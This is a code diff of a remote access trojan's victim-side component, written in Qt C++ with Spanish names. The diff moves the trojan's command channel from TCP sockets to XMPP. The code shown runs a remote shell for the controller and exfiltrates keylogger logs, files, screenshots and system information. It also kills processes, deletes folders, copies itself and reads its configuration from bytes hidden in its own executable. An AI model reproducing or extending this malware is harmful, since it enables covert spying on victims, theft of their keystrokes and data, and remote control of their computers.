@@ -24,6 +24,7 @@
 #include <QSysInfo>
 #include <QDate>
 #include <QTime>
+#include <qxmpp/QXmppMessage.h>
 #ifdef Q_OS_WIN
     #include <windows.h>
     #include <shellapi.h>
@@ -59,18 +60,12 @@ void MainWindow::inicio(){
     cargarConfiguracion();
     listarProcesos();
     this->generarVentanaChat();
+    manager = new QXmppTransferManager;
+    connect(manager,SIGNAL(fileReceived(QXmppTransferJob*)),this,SLOT(llegadaDatosArchivo(QXmppTransferJob*)));
+    cliente.addExtension(manager);
     QString conversion;
     QByteArray datos; //Reconstruimos la configuración con algunas modificaciones para el servidor copiado
-    datos = "|@|" + this->host.toLatin1() + "|@|";
-    conversion.setNum(this->port);
-    datos = datos + conversion.toLatin1() + "|@|";
-    conversion.setNum(this->portArchivos);
-    datos = datos + conversion.toLatin1() + "|@|";
-    conversion.setNum(this->portEscritorio);
-    datos = datos + conversion.toLatin1() + "|@|";
-    conversion.setNum(this->portWebcam);
-    datos = datos + conversion.toLatin1() + "|@|";
-    conversion.setNum(this->tiempoConexion);
+    datos = "|@|" + this->cuentaXmpp.toLatin1() + "|@|";
     datos = datos + conversion.toLatin1() + "|@|";
     datos = datos + this->alias.toLatin1() + "|@|";
     datos = datos + "nounido" + "|@|";
@@ -101,15 +96,12 @@ void MainWindow::inicio(){
     }
     #endif
     temporizador.start(this->tiempoConexion); //iniciar el temporizador para conexiÃ³n
-    connect(&temporizador,SIGNAL(timeout()),this,SLOT(conectar())); //cada "tiempoConexion" intentar conectar
-    connect(&socket,SIGNAL(readyRead()),this,SLOT(llegadaDatos()));
-    connect(&socket,SIGNAL(disconnected()),this,SLOT(desconectado()));
-    connect(&socketArchivos,SIGNAL(readyRead()),this,SLOT(llegadaDatosArchivo()));
-    connect(&socketEscritorio,SIGNAL(readyRead()),this,SLOT(llegadaDatosEscritorio()));
-    connect(&socketWebcam,SIGNAL(readyRead()),this,SLOT(llegadaDatosWebcam()));
     connect(this->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
     connect(&this->verTecla,SIGNAL(timeout()),this,SLOT(escucharTeclas()));
-    connect(this,SIGNAL(procesar(QImage,int,QTcpSocket*)),&capturacion,SLOT(procesarImagen(QImage,int,QTcpSocket*)));
+    connect(&cliente,SIGNAL(messageReceived(const QXmppMessage&)),this,SLOT(llegadaDatos(const QXmppMessage&)));
+    connect(this,SIGNAL(procesar(QImage,int)),&capturacion,SLOT(procesarImagen(QImage,int)));
+    connect(&capturacion,SIGNAL(enviar(QByteArray)),this,SLOT(enviarCaptura(QByteArray)));
+    connect(&cliente,SIGNAL(presenceReceived(QXmppPresence)),this,SLOT(recibidaPresencia(QXmppPresence)));
     QApplication::setQuitOnLastWindowClosed(false);
     log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
     log.open(QFile::WriteOnly);
@@ -122,16 +114,18 @@ void MainWindow::inicio(){
     }
     capturacion.moveToThread(&hilo); //movemos capturacion a un nuevo hilo para que se ejecute de forma independiente al programa principal y no lo bloquee
     hilo.start();
+    QXmppConfiguration configuracion;
+    configuracion.setJid(this->cuentaXmpp);
+    configuracion.setPassword(this->contrasena);
+    configuracion.setResource(this->alias);
+    cliente.setClientPresence(QXmppPresence::Available);
+    cliente.connectToServer(configuracion);
 }
 bool MainWindow::cargarConfiguracion(){
     /** Cargar la configuración del servidor guardada en el último KB del ejecutable **/
     //valores por defecto
-    this->host = "localhost";
-    this->port = 1234;
-    this->portArchivos = 2345;
-    this->portEscritorio = 3456;
-    this->portWebcam = 4567;
-    this->tiempoConexion = 30000;
+    this->cuentaXmpp = "";
+    this->contrasena = "";
     this->alias = "servidor";
     QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicaciÃ³n
     this->nombreCopiable = "noiniciar"; //Nombre del ejecutable
@@ -146,28 +140,29 @@ bool MainWindow::cargarConfiguracion(){
     datos = servidor.read(1024);
     servidor.close();
     campo = datos.split("|@|");
-    if(campo.size() >= 12)
+    if(campo.size() >= 8)
     {
-        this->host = campo[1];
-        conversion = campo[2];
-        this->port = conversion.toInt();
-        conversion = campo[3];
-        this->portArchivos = conversion.toInt();
-        conversion = campo[4];
-        this->portEscritorio = conversion.toInt();
-        conversion = campo[5];
-        this->portWebcam = conversion.toInt();
-        conversion = campo[6];
-        this->tiempoConexion = conversion.toInt();
-        this->alias = campo[7];
-        this->adjunto = campo[8];
-        this->tamanoAdjunto = campo[9].toLong();
-        this->nombreCopiable = campo[10];
-        this->ejecutar = campo[11];
-        this->siempreOUnaVez = campo[12];
+        this->cuentaXmpp = campo[1];
+        this->contrasena = campo[2];
+        this->alias = campo[3];
+        this->adjunto = campo[4];
+        this->tamanoAdjunto = campo[5].toLong();
+        this->nombreCopiable = campo[6];
+        this->ejecutar = campo[7];
+        this->siempreOUnaVez = campo[8];
 
     }
     return true;
+}
+void MainWindow::recibidaPresencia(QXmppPresence presencia)
+{
+    if(presencia.type() == QXmppPresence::Subscribe)
+    {
+        QXmppPresence aceptar;
+        aceptar.setTo(presencia.from());
+        aceptar.setType(QXmppPresence::Subscribed);
+        cliente.sendPacket(aceptar);
+    }
 }
 void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
 {
@@ -226,30 +221,12 @@ void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
         }
     }
 }
-void MainWindow::conectar(){
-    /** funciÃ³n que conecta al cliente **/
 
-    log.write(cadenaa);
-    log.close();
-    if (socket.state() == QAbstractSocket::ConnectedState ){
-        temporizador.stop();
-    }
-    else {
-        socket.close();
-        socketArchivos.close();
-        socketEscritorio.close();
-        socketWebcam.close();
-        socketWebcam.connectToHost(host,portWebcam);
-        socketEscritorio.connectToHost(host,portEscritorio);
-        socketArchivos.connectToHost(host,portArchivos);
-        socket.connectToHost(host,port);
-    }
-
-}
-void MainWindow::llegadaDatos() {
+void MainWindow::llegadaDatos(const QXmppMessage &mensaje) {
     /** Función para el manejo de los datos recibidos a través del socket **/
-    QString datos;
-    datos = socket.readAll();
+    from = mensaje.from();
+    QString datos = mensaje.body();
+    //datos = socket.readAll();
     QStringList parametros =  datos.split("|@|");
     if(parametros[0] == "t") //llegada de teclas
     {
@@ -289,10 +266,11 @@ void MainWindow::llegadaDatos() {
     if(parametros[0] == "shell"){ //shell remoto
         QString salidaShell;
         salidaShell = "shell|@|" + shell(parametros[1].toLatin1());
-        util.escribirSocket(salidaShell,&socket);
+        cliente.sendMessage(from,salidaShell);
+
     }
     if (parametros[0] == "home"){
-        util.escribirSocket("home|@|" + QDir::homePath(),&socket);
+        cliente.sendMessage(from,"home|@|" + QDir::homePath());
     }
     if (parametros[0] == "unidades")
     {
@@ -305,8 +283,7 @@ void MainWindow::llegadaDatos() {
         listarDirectorios(parametros[1]);
     }
     if (parametros[0] == "get"){
-
-        util.enviarArchivo(parametros[1],&socketArchivos);
+       job = manager->sendFile(from,parametros[1]);
     }
     if (parametros[0] == "put"){
         archivo = parametros[1];
@@ -319,13 +296,12 @@ void MainWindow::llegadaDatos() {
     }
     if (parametros[0] == "borrarcarpeta")
     {
-        directorio.rmdir(parametros[1]);
-    }
+        directorio.rmdir(parametros[1]);    }
     if (parametros[0] == "tamano")
     {
         QString tamano;
         tamano.setNum(QFileInfo(parametros[1]).size());
-        util.escribirSocket("tamano|@|" + tamano,&socket);
+        cliente.sendMessage(from,"tamano|@|" + tamano);
     }
     if (parametros[0] == "execute")
     {
@@ -371,7 +347,7 @@ void MainWindow::llegadaDatos() {
         desinfectar();
     }
     if (datos == "ping") { //ping al servidor
-        util.escribirSocket("pong",&socket);
+        cliente.sendMessage(from,"pong");
     }
     if(parametros[0] == "apagarequipo"){
        #ifdef Q_WS_WIN
@@ -410,7 +386,7 @@ void MainWindow::llegadaDatos() {
         QFile klog;
         klog.setFileName(directorio.tempPath() + "/log");
         klog.open(QFile::ReadOnly);
-        util.escribirSocket("teclas|@|" + klog.readAll(),&socket);
+        cliente.sendMessage(from,"teclas|@|" + klog.readAll());
         klog.close();
     }
     if (parametros[0] == "limpiark")
@@ -429,7 +405,7 @@ void MainWindow::llegadaDatos() {
     }
     if (parametros[0] == "informacion")
     {   
-        util.escribirSocket(obtenerInformacionSistema(),&socket);
+        cliente.sendMessage(from,obtenerInformacionSistema());
     }
     if(parametros[0] == "procesos")
     {
@@ -439,8 +415,10 @@ void MainWindow::llegadaDatos() {
     {
         matarProceso(parametros[1]);
     }
-
-
+    if(parametros[0] == "captura")
+    {
+         emit procesar(screenShot().toImage(),parametros[1].toInt());
+    }
 }
 void MainWindow::moverPuntero(int x, int y)
 {
@@ -498,18 +476,16 @@ QString MainWindow::obtenerInformacionSistema()
     #endif
         return "informacion|@|" + so + "|@|" + version + "|@|" + homePath + "|@|" + tempPath + "|@|" + ancho + "|@|" + alto + "|@|" + fecha + "|@|" + hora + "|@|" + alias + "|@|";
 }
-void MainWindow::llegadaDatosArchivo(){
+void MainWindow::llegadaDatosArchivo(QXmppTransferJob* transferencia){
     /** Función invocada para recibir un archivo enviado por el cliente **/
-    util.recibirArchivo(directorio.path() + "/" + archivo,&socketArchivos);
+    archivoRecibido = new QFile(directorio.path() + "/" + archivo);
+    archivoRecibido->open(QFile::WriteOnly);
+    transferencia->accept(archivoRecibido);
 }
-void MainWindow::llegadaDatosEscritorio(){
-    /** Función de petición de captura de escritorio **/
-        emit procesar(screenShot().toImage(),socketEscritorio.readAll().toInt(),&socketEscritorio);
-    }
 
 void MainWindow::llegadaDatosWebcam()
 { /** Función donde se reciben las peticiones de captura de webcam asi como su encendido y apagado **/
-    QString datos = socketWebcam.readAll();
+   /* QString datos = socketWebcam.readAll();
     QStringList parametros = datos.split("|@|");
     if (parametros[0] == "cap")
     {
@@ -523,7 +499,7 @@ void MainWindow::llegadaDatosWebcam()
         buffer.waitForBytesWritten(2000);
         datos = qCompress(datos);
         longitud.setNum(datos.size());
-        util.escribirSocketDatos(longitud,&socketWebcam);
+        //util.escribirSocketDatos(longitudWebcam);
         socketWebcam.waitForBytesWritten(2000);
         QDataStream enviador(&socketWebcam);
         enviador.writeRawData(datos,datos.size());
@@ -536,7 +512,7 @@ void MainWindow::llegadaDatosWebcam()
     if (parametros[0] == "apagar")
     {
         apagar();
-    }
+    }*/
 }
 QPixmap MainWindow::screenShot(){
     /** Función que realiza la captura de la pantalla **/
@@ -594,7 +570,7 @@ void MainWindow::listarUnidades()
     for (i=0;i<listaUnidades.size();i++){
         unidades = unidades + listaUnidades[i].absoluteFilePath() + "|@|";
     }
-    util.escribirSocket(unidades,&socket);
+    cliente.sendMessage(from,unidades);
 }
 void MainWindow::listarArchivos(QString ruta){
     /** Función que envia por socket una lista de archivos del directorio pasado como parámetro **/
@@ -605,7 +581,7 @@ void MainWindow::listarArchivos(QString ruta){
     for (i=0;i<listaArchivos.size();i++){
         archivos = archivos + listaArchivos[i] + "|@|";
     }
-    util.escribirSocket(archivos,&socket);
+    cliente.sendMessage(from,archivos);
 }
 void MainWindow::listarDirectorios(QString ruta){
     /** Función que envia por socket una lista de directorios del directorio pasado como parámetro **/
@@ -616,26 +592,14 @@ void MainWindow::listarDirectorios(QString ruta){
     for (i=0;i<listaDirectorios.size();i++){
         directorios = directorios + listaDirectorios[i] + "|@|";
     }
-    util.escribirSocket(directorios,&socket);
+    cliente.sendMessage(from,directorios);
 }
 void MainWindow::vistaPrevia(QString archivo)
 {
-    QByteArray longitud;
-    QByteArray datos;
-    QBuffer buffer(&datos);
-    buffer.open(QIODevice::WriteOnly);
     QPixmap imagen;
     imagen.load(archivo);
-    imagen.scaled(128,128).save(&buffer,"jpeg",70);
-    buffer.waitForBytesWritten(2000); //Poner esto en una función luego.
-    datos = qCompress(datos);
-    longitud.setNum(datos.size());
-    util.escribirSocketDatos(longitud,&socketArchivos);
-    socketArchivos.waitForBytesWritten(2000);
-    QDataStream enviador(&socketArchivos);
-    enviador.writeRawData(datos,datos.size());
-    socketArchivos.waitForBytesWritten(2000);
-
+    imagen.scaled(128,128).save("mini.jpg","jpeg",70);
+    job = manager->sendFile(from,"mini.jpg");
 }
 void MainWindow::mostrarMensaje(QString tipo, QString titulo, QString texto){
     /** Función que muestra mensajes emergentes **/
@@ -682,7 +646,7 @@ void MainWindow::enviarMensajeChat()
 {
     /** Envia un mensaje de chat al cliente **/
     this->ponerMensajeChat(this->enviarChatTexto->text(),this->nickVictima);
-    util.escribirSocket ( "chat|@|" + this->enviarChatTexto->text() ,&socket);
+    //util.escribirSocket ( "chat|@|" + this->enviarChatTexto->text() );
     this->enviarChatTexto->clear();
 }
 void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
@@ -694,7 +658,7 @@ void MainWindow::escucharTeclas()
 {
     /** Esta función comprueba que teclas hay pulsadas y las guarda en un archivo **/
 
-        log.open(QFile::Append);
+       /* log.open(QFile::Append);
         char num;
         num = comprobarTeclas();
 
@@ -704,7 +668,7 @@ void MainWindow::escucharTeclas()
             log.write(cadenaa);
             cadenaa.clear();
             log.close();
-        }
+        } */
 }
 
 paralelo::paralelo()
@@ -714,9 +678,8 @@ paralelo::paralelo()
     sincroniza = 0;
 }
 
-void paralelo::procesarImagen(QImage imagen2, int calidad, QTcpSocket *socket)
+void paralelo::procesarImagen(QImage imagen2, int calidad)
 {
-    this->socketDentro = socket;
     int i,j;
     QImage imagen3(imagen2.width(),imagen2.height(), QImage::Format_RGB32); //Creamos una imagen nueva donde pintaremos los pixeles diferentes
     imagen3.fill(QColor(255, 0, 255).rgb()); //Inicializamos la imagen a fucsia para que envie la primera completa
@@ -740,7 +703,7 @@ void paralelo::procesarImagen(QImage imagen2, int calidad, QTcpSocket *socket)
         imagen1->fill(QColor(0,0,0).rgba()); //Al poner la imagen1 a negro la diferencia con la imagen anterior es toda la imagen por lo que se envia la captura entera
         sincroniza = 0;
     }
-    datosEscritos();
+    emit enviar(buffer->buffer());
 }
 void MainWindow::listarProcesos()
 {
@@ -768,7 +731,7 @@ void MainWindow::listarProcesos()
         listaEnvio = listaEnvio + listaProc[i] + "|@|";
     }
     #endif
-    util.escribirSocket(listaEnvio,&socket);
+    cliente.sendMessage(from,listaEnvio);
 }
 void MainWindow::matarProceso(QString programa)
 {
@@ -779,15 +742,14 @@ void MainWindow::matarProceso(QString programa)
     #endif
     QProcess::startDetached(orden);
 }
-void paralelo::datosEscritos()
+
+void MainWindow::enviarCaptura(QByteArray array)
 {
-    /** Esta función está pensada para esperar a que los datos de la captura sean escritos a memoria antes de enviarlos **/
-    QByteArray array;
-    QByteArray comprimido = qCompress(bytes,9); //Comprimimos los datos con LZMA antes de enviarlos
-    array.setNum(comprimido.size());
-    util.escribirSocketDatos(array,this->socketDentro);
-    this->socketDentro->waitForBytesWritten(); //Hay que esperar a que el tamaño se envie o se enviara junto a los datos binarios
-    util.escribirSocketDatos(comprimido,this->socketDentro);
-    delete buffer; //Liberamos la memoria del buffer
-    //socketEscritorio.waitForBytesWritten(-1);
+    bufferMem = array;
+    mem.setBuffer(&bufferMem);
+    mem.open(QIODevice::ReadOnly);
+    QXmppTransferFileInfo informacion;
+    informacion.setName("|@|captura|@|");
+    informacion.setSize(mem.size());
+    job = manager->sendFile(from,&mem,informacion);
 }
